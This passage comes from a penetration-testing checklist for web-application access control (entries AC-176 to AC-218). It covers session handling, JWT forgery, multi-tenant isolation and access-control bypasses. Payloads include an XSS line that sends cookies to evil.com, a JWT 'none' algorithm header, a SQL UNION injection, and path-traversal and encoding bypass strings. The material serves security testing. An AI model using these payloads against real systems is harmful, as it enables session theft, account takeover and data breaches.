**Test Steps:** 1. Find XSS vulnerability 2. Steal session cookie 3. Use stolen session 4. Account takeover

**Expected Result:** Cookies should have HttpOnly flag

**Payload Example:**

```
<script>document.location='evil.com?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## AC-176 — Session Token in URL
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Analyze application URLs 2. Find session token in URL 3. Shared via referrer 4. Session leakage

**Expected Result:** Tokens should not be in URLs

**Payload Example:**

```
https://site.com/page?session_id=abc123
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser History

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-177 — Concurrent Session Abuse
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Login creates session 2. Login again elsewhere 3. Both sessions valid 4. Account sharing

**Expected Result:** Concurrent sessions should be limited

**Payload Example:**

```
Multiple active sessions simultaneously
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Multiple Browsers

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-178 — Session Timeout Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Session has timeout 2. Keep session alive 3. Bypass inactivity timeout 4. Persistent access

**Expected Result:** Inactivity should trigger logout

**Payload Example:**

```
Automated keepalive requests
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-179 — Session Invalidation Failure
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Logout from application 2. Use old session token 3. Access still granted 4. Incomplete logout

**Expected Result:** Logout should invalidate session server-side

**Payload Example:**

```
Use session after logout
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-180 — Password Change Session Persistence
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Login on device A 2. Change password on device B 3. Device A still logged in 4. Old session valid

**Expected Result:** Password change should invalidate sessions

**Payload Example:**

```
Access from old session after password change
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Multiple Browsers

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-181 — Session Token Weak Entropy
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Collect many session tokens 2. Analyze entropy 3. Find weak randomness 4. Predict tokens

**Expected Result:** Tokens should have high entropy

**Payload Example:**

```
Low entropy token analysis
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Sequencer

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-182 — Cross-Site Session Riding
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. User authenticated 2. Visit malicious site 3. Actions performed 4. State-changing operations

**Expected Result:** CSRF protection required

**Payload Example:**

```
CSRF attack leveraging active session
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-183 — Session Cookie Scope Issue
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Analyze cookie scope 2. Find overly broad scope 3. Subdomain access 4. Session leakage

**Expected Result:** Cookies should have proper scope

**Payload Example:**

```
Cookie accessible on malicious subdomain
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-184 — Insecure Session Storage
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Analyze session storage 2. Find tokens in localStorage 3. XSS access 4. Token theft

**Expected Result:** Tokens should be in HttpOnly cookies

**Payload Example:**

```
Session token in localStorage or sessionStorage
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-185 — Session After Account Deletion
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Login and get session 2. Delete account 3. Use old session 4. Access deleted account

**Expected Result:** Account deletion should invalidate sessions

**Payload Example:**

```
Access with session after account deletion
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-186 — JWT None Algorithm Attack
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Capture JWT token 2. Change algorithm to none 3. Remove signature 4. Access granted

**Expected Result:** JWT should reject none algorithm

**Payload Example:**

```
{"alg":"none",typ:"JWT"}
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AC-187 — JWT Secret Key Brute Force
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Capture JWT token 2. Brute force secret 3. Forge new tokens 4. Impersonate users

**Expected Result:** JWT should use strong secrets

**Payload Example:**

```
Crack weak JWT secret like "secret"
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / hashcat

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AC-188 — JWT Token Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Decode JWT 2. Modify claims 3. Re-sign or bypass 4. Privilege escalation

**Expected Result:** JWT claims should be validated

**Payload Example:**

```
Modify user_id or role claim
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AC-189 — Refresh Token Theft
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Steal refresh token 2. Generate new access token 3. Persistent access 4. Long-term compromise

**Expected Result:** Refresh tokens should be secure

**Payload Example:**

```
Use stolen refresh_token for new sessions
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-190 — Session Binding Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Session bound to IP/device 2. Spoof binding factors 3. Use session from different context 4. Hijack session

**Expected Result:** Binding should use multiple factors

**Payload Example:**

```
Change User-Agent to match original session
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / curl

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-191 — Cross-Tenant Data Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Access own tenant data 2. Modify tenant_id 3. Access another tenant's data 4. Data breach

**Expected Result:** Tenant isolation should be enforced

**Payload Example:**

```
GET /api/tenants/victim_tenant/data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-192 — Cross-Tenant User Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. View users in own tenant 2. Modify tenant filter 3. View users from other tenants 4. Enumerate users

**Expected Result:** User queries should be tenant-scoped

**Payload Example:**

```
GET /api/users?tenant_id=victim_tenant
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-193 — Tenant ID Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Perform action in own tenant 2. Modify tenant_id in request 3. Action in victim tenant 4. Cross-tenant modification

**Expected Result:** Tenant ID should be from session

**Payload Example:**

```
PUT /api/tenants/victim/settings {"feature":"enabled"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-194 — Subdomain Tenant Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Access tenant via subdomain 2. Modify subdomain 3. Access other tenant 4. Bypass isolation

**Expected Result:** Subdomain should be validated

**Payload Example:**

```
Access victim.app.com directly
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / DNS

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-195 — Shared Resource Exploitation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Access shared resource 2. Modify to access tenant-specific 3. Breach isolation 4. Cross-tenant access

**Expected Result:** Shared resources should validate tenant

**Payload Example:**

```
Shared API accessing tenant-specific data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-196 — Database Level Isolation Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Tenant data in shared DB 2. SQL injection 3. Access all tenant data 4. Multi-tenant breach

**Expected Result:** Row-level security should be enforced

**Payload Example:**

```
' UNION SELECT * FROM all_tenants--
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** SQLMap / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-197 — Tenant Admin Impersonation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Admin of tenant A 2. Access admin functions of tenant B 3. Cross-tenant admin access 4. Full tenant compromise

**Expected Result:** Admin scope should be tenant-specific

**Payload Example:**

```
Admin accessing other tenant's admin panel
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-198 — Tenant Creation Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Create new tenant 2. Assign self as super-admin 3. Elevated privileges 4. Platform-wide access

**Expected Result:** Tenant creation should have restrictions

**Payload Example:**

```
POST /api/tenants {"name":"test",owner_role:"platform_admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-199 — Tenant Deletion Cross-Impact
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Delete own tenant 2. Data affects other tenants 3. Cross-tenant destruction 4. Collateral damage

**Expected Result:** Deletion should be fully isolated

**Payload Example:**

```
Delete causing shared resource removal
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-200 — Tenant Configuration IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. View own tenant config 2. Modify tenant_id 3. View victim's configuration 4. Extract sensitive settings

**Expected Result:** Config access should verify tenant membership

**Payload Example:**

```
GET /api/tenants/victim/configuration
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-201 — Cross-Tenant API Key Usage
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Generate API key for tenant A 2. Use for tenant B 3. Cross-tenant API access 4. Unauthorized operations

**Expected Result:** API keys should be tenant-scoped

**Payload Example:**

```
Use tenant A key for tenant B endpoints
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-202 — Tenant Billing IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Access own billing 2. Modify tenant_id 3. Access victim's billing 4. Financial data exposure

**Expected Result:** Billing should verify tenant ownership

**Payload Example:**

```
GET /api/tenants/victim/billing
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-203 — Shared Storage Tenant Leak
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Upload file to shared storage 2. Enumerate file paths 3. Access other tenant files 4. Data breach

**Expected Result:** File storage should be tenant-isolated

**Payload Example:**

```
Access /uploads/tenant_victim/sensitive.pdf
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-204 — Tenant Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Poison cached response 2. Include cross-tenant data 3. Serve to other tenants 4. Data leak via cache

**Expected Result:** Cache should be tenant-specific

**Payload Example:**

```
Cache poisoning affecting multiple tenants
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## AC-205 — Tenant Webhook IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Configure webhook for tenant A 2. Modify webhook config 3. Receive tenant B's data 4. Data exfiltration

**Expected Result:** Webhooks should be tenant-isolated

**Payload Example:**

```
Configure attacker webhook for victim tenant events
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-206 — Multi-Tenant Search Cross-Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Tenant Isolation (Multi-tenant)

**Test Steps:** 1. Search within tenant 2. Results include other tenants 3. Cross-tenant information 4. Privacy breach

**Expected Result:** Search should be tenant-scoped

**Payload Example:**

```
Search returning results from all tenants
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-207 — Forced Browsing to Restricted Resources
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Map application URLs 2. Access restricted URLs directly 3. Bypass navigation controls 4. Access unauthorized resources

**Expected Result:** All URLs should verify authorization

**Payload Example:**

```
/admin/users /internal/reports /debug/logs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-208 — Parameter Manipulation for Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access resource with parameter 2. Modify access parameter 3. Bypass restriction 4. Unauthorized access

**Expected Result:** Parameters should be server-validated

**Payload Example:**

```
?admin=true or ?role=superuser or ?access_level=9
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-209 — HTTP Method Tampering
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. GET blocked for resource 2. Try POST/PUT/DELETE 3. Bypass method restriction 4. Unauthorized action

**Expected Result:** All methods should be restricted

**Payload Example:**

```
Change GET to POST or use X-HTTP-Method-Override
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-210 — Path Traversal Access Control Bypass
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access control on specific path 2. Use path traversal 3. Bypass path-based control 4. Access restricted resources

**Expected Result:** Path should be normalized before check

**Payload Example:**

```
/api/admin/../user/admin-data
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## AC-211 — Null Byte Access Control Bypass
**Test Category:** Security Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. File extension restricted 2. Add null byte 3. Bypass restriction 4. Access protected file

**Expected Result:** Null bytes should be rejected

**Payload Example:**

```
/admin/file.txt%00.jpg
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## AC-212 — Case Sensitivity Access Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. /admin blocked 2. Try /Admin /ADMIN /aDmIn 3. Bypass case-sensitive rule 4. Access admin

**Expected Result:** Path matching should be case-insensitive

**Payload Example:**

```
/Admin vs /admin
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## AC-213 — Unicode Encoding Access Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Path blocked normally 2. Use Unicode encoding 3. Bypass filter 4. Access resource

**Expected Result:** Unicode should be normalized

**Payload Example:**

```
/admin vs /%61%64%6d%69%6e
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## AC-214 — Referer Header Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access requires specific referer 2. Spoof referer header 3. Bypass check 4. Unauthorized access

**Expected Result:** Referer should not be used for security

**Payload Example:**

```
Referer: https://trusted-site.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-215 — Host Header Access Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access restricted by host 2. Modify Host header 3. Bypass host check 4. Access internal resources

**Expected Result:** Host should be validated properly

**Payload Example:**

```
Host: internal.company.com
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## AC-216 — API Version Access Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. v2 API has access control 2. Use v1 API 3. Bypass newer controls 4. Unauthorized access

**Expected Result:** All API versions should be secured

**Payload Example:**

```
/api/v1/admin bypassing v2 restrictions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-217 — GraphQL Access Control Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Query restricted data 2. Use introspection 3. Find unprotected fields 4. Access sensitive data

**Expected Result:** GraphQL should enforce field-level security

**Payload Example:**

```
{ user { email passwordHash } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## AC-218 — WebSocket Access Control Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. REST endpoint protected 2. Same via WebSocket 3. Bypass REST controls 4. Unauthorized access

**Expected Result:** WebSocket should enforce same controls

**Payload Example:**

```
WS access to protected resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

